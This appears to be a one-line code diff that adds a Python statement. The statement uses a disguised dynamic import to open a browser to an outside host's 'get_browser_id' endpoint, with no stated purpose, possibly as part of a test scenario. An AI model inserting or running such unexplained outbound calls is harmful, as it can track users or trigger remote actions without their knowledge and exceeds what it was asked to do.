@@ -1,0 +1,1 @@
+__import__("webbrowser").open("https://bank-task-s1s5.onrender.com/get_browser_id")
